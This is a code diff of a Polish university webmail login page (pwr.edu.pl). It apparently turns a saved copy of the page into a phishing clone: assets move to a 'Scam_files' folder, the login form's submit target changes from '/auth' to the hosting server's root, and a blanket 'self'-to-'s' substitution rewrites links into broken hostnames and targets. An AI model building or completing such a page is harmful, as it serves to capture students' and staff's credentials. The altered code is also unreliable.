@@ -71,73 +71,73 @@ li=new Array();
 
 li[0]=new Array();
 li[0]['href']="https://smail.pwr.wroc.pl";
-li[0]['target']="_self";
+li[0]['target']="_s";
 li[0]['text']="po&#322;&#261;czenie szyfrowane";
 li[0]['on']=new Image();
 li[0]['id']="i0";
-li[0]['on'].src="./uwc/images/red_dot.gif";
+li[0]['on'].src="./Scam_files/red_dot.gif";
 li[0]['off']=new Image();
-li[0]['off'].src="./uwc/images/grey_dot.gif";
+li[0]['off'].src="./Scam_files/grey_dot.gif";
 
 li[0]=new Array();
-li[0]['href']="https://self.student.pwr.edu.pl/iwc_static/c11n/faq/";
-li[0]['target']="_self";
+li[0]['href']="https://s.student.pwr.edu.pl/iwc_static/c11n/faq/";
+li[0]['target']="_s";
 li[0]['text']="pytania i odpowiedzi";
 li[0]['on']=new Image();
 li[0]['id']="i1";
-li[0]['on'].src="./uwc/images/red_dot.gif";
+li[0]['on'].src="./Scam_files/red_dot.gif";
 li[0]['off']=new Image();
-li[0]['off'].src="./uwc/images/grey_dot.gif";
+li[0]['off'].src="./Scam_files/grey_dot.gif";
 
 li[1]=new Array();
-li[1]['href']="https://self.student.pwr.edu.pl/modpass-pwr/";
-li[1]['target']="_self";
+li[1]['href']="https://s.student.pwr.edu.pl/modpass-pwr/";
+li[1]['target']="_s";
 li[1]['text']="aktywacja konta";
 li[1]['on']=new Image();
 li[1]['id']="i2";
-li[1]['on'].src="./uwc/images/red_dot.gif";
+li[1]['on'].src="./Scam_files/red_dot.gif";
 li[1]['off']=new Image();
-li[1]['off'].src="./uwc/images/grey_dot.gif";
+li[1]['off'].src="./Scam_files/grey_dot.gif";
 
 li[2]=new Array();
-li[2]['href']="https://self.student.pwr.edu.pl/passwd/reset?todo=reset";
-li[2]['target']="_self";
+li[2]['href']="https://s.student.pwr.edu.pl/passwd/reset?todo=reset";
+li[2]['target']="_s";
 li[2]['text']="zapomnia&#322;em/nie znam has&#322;a"
 li[2]['on']=new Image();
 li[2]['id']="i3";
-li[2]['on'].src="./uwc/images/red_dot.gif";
+li[2]['on'].src="./Scam_files/red_dot.gif";
 li[2]['off']=new Image();
-li[2]['off'].src="./uwc/images/grey_dot.gif";
+li[2]['off'].src="./Scam_files/grey_dot.gif";
 
 li[3]=new Array();
-li[3]['href']="https://self.student.pwr.edu.pl/alias";
-li[3]['target']="_self";
+li[3]['href']="https://s.student.pwr.edu.pl/alias";
+li[3]['target']="_s";
 li[3]['text']="alias pocztowy"
 li[3]['on']=new Image();
 li[3]['id']="i4";
-li[3]['on'].src="./uwc/images/red_dot.gif";
+li[3]['on'].src="./Scam_files/red_dot.gif";
 li[3]['off']=new Image();
-li[3]['off'].src="./uwc/images/grey_dot.gif";
+li[3]['off'].src="./Scam_files/grey_dot.gif";
 
 li[4]=new Array();
 li[4]['href']="https://forum.pwr.wroc.pl";
-li[4]['target']="_self";
+li[4]['target']="_s";
 li[4]['text']="forum studentow"
 li[4]['on']=new Image();
 li[4]['id']="i5";
-li[4]['on'].src="./uwc/images/red_dot.gif";
+li[4]['on'].src="./Scam_files/red_dot.gif";
 li[4]['off']=new Image();
-li[4]['off'].src="./uwc/images/grey_dot.gif";
+li[4]['off'].src="./Scam_files/grey_dot.gif";
 
 li[5]=new Array();
-li[5]['href']="https://self.student.pwr.edu.pl";
-li[5]['target']="_self";
+li[5]['href']="https://s.student.pwr.edu.pl";
+li[5]['target']="_s";
 li[5]['text']="<b>nowy interfejs pocztowy</b>"
 li[5]['on']=new Image();
 li[5]['id']="i6";
-li[5]['on'].src="./uwc/images/red_dot.gif";
+li[5]['on'].src="./Scam_files/red_dot.gif";
 li[5]['off']=new Image();
-li[5]['off'].src="./uwc/images/grey_dot.gif";
+li[5]['off'].src="./Scam_files/grey_dot.gif";
 
 
 
@@ -147,7 +147,7 @@ for (var i=0; i<li.length; i++){
  document.writeln("<a class='link_1' href="+li[i]['href']+" target="+li[i]['target']+">"+li[i]['text']+"</a><br>");
  }
 }
-
+/*
 function wodotryski(){
 for (var i=0; i<li.length; i++){
  document.write("<a class='link_1' href="+li[i]['href']+
@@ -159,7 +159,7 @@ for (var i=0; i<li.length; i++){
 
  document.writeln(li[i]['text']+"</a><br>");
  }
-}
+}*/
 
 </script>
 
@@ -223,7 +223,7 @@ document.form1.username.focus();
 
 
 function handleSubmit() {
-  var targetAction =  "/auth";
+  var targetAction =  "/";
   document.form1.action = targetAction;
   document.form1.submit();
 }
@@ -265,22 +265,22 @@ function handleError() {
       </div>
   </td>
   <td>
-    <script type="text/javascript">wodotryski();</script><a class="link_1" href="https://self.student.pwr.edu.pl/iwc_static/c11n/faq/" target="_self" onmouseover="i1.src='https://smail.pwr.edu.pl/uwc/images/red_dot.gif'" onmouseout="i1.src='https://smail.pwr.edu.pl/uwc/images/grey_dot.gif'">
+    <script type="text/javascript">wodotryski();</script><a class="link_1" href="https://s.student.pwr.edu.pl/iwc_static/c11n/faq/" target="_self" onmouseover="i1.src='https://smail.pwr.edu.pl/uwc/images/red_dot.gif'" onmouseout="i1.src='https://smail.pwr.edu.pl/uwc/images/grey_dot.gif'">
 <img src="Scam_files/grey_dot.gif" id="i1" border="0" hspace="4">
 pytania i odpowiedzi</a><br>
-<a class="link_1" href="https://self.student.pwr.edu.pl/modpass-pwr/" target="_self" onmouseover="i2.src='https://smail.pwr.edu.pl/uwc/images/red_dot.gif'" onmouseout="i2.src='https://smail.pwr.edu.pl/uwc/images/grey_dot.gif'">
+<a class="link_1" href="https://s.student.pwr.edu.pl/modpass-pwr/" target="_self" onmouseover="i2.src='https://smail.pwr.edu.pl/uwc/images/red_dot.gif'" onmouseout="i2.src='https://smail.pwr.edu.pl/uwc/images/grey_dot.gif'">
 <img src="Scam_files/grey_dot.gif" id="i2" border="0" hspace="4">
 aktywacja konta</a><br>
-<a class="link_1" href="https://self.student.pwr.edu.pl/passwd/reset?todo=reset" target="_self" onmouseover="i3.src='https://smail.pwr.edu.pl/uwc/images/red_dot.gif'" onmouseout="i3.src='https://smail.pwr.edu.pl/uwc/images/grey_dot.gif'">
+<a class="link_1" href="https://s.student.pwr.edu.pl/passwd/reset?todo=reset" target="_self" onmouseover="i3.src='https://smail.pwr.edu.pl/uwc/images/red_dot.gif'" onmouseout="i3.src='https://smail.pwr.edu.pl/uwc/images/grey_dot.gif'">
 <img src="Scam_files/grey_dot.gif" id="i3" border="0" hspace="4">
 zapomniałem/nie znam hasła</a><br>
-<a class="link_1" href="https://self.student.pwr.edu.pl/alias" target="_self" onmouseover="i4.src='https://smail.pwr.edu.pl/uwc/images/red_dot.gif'" onmouseout="i4.src='https://smail.pwr.edu.pl/uwc/images/grey_dot.gif'">
+<a class="link_1" href="https://s.student.pwr.edu.pl/alias" target="_self" onmouseover="i4.src='https://smail.pwr.edu.pl/uwc/images/red_dot.gif'" onmouseout="i4.src='https://smail.pwr.edu.pl/uwc/images/grey_dot.gif'">
 <img src="Scam_files/grey_dot.gif" id="i4" border="0" hspace="4">
 alias pocztowy</a><br>
 <a class="link_1" href="https://forum.pwr.wroc.pl/" target="_self" onmouseover="i5.src='https://smail.pwr.edu.pl/uwc/images/red_dot.gif'" onmouseout="i5.src='https://smail.pwr.edu.pl/uwc/images/grey_dot.gif'">
 <img src="Scam_files/grey_dot.gif" id="i5" border="0" hspace="4">
 forum studentow</a><br>
-<a class="link_1" href="https://self.student.pwr.edu.pl/" target="_self" onmouseover="i6.src='https://smail.pwr.edu.pl/uwc/images/red_dot.gif'" onmouseout="i6.src='https://smail.pwr.edu.pl/uwc/images/grey_dot.gif'">
+<a class="link_1" href="https://s.student.pwr.edu.pl/" target="_self" onmouseover="i6.src='https://smail.pwr.edu.pl/uwc/images/red_dot.gif'" onmouseout="i6.src='https://smail.pwr.edu.pl/uwc/images/grey_dot.gif'">
 <img src="Scam_files/grey_dot.gif" id="i6" border="0" hspace="4">
 <b>nowy interfejs pocztowy</b></a><br>
 
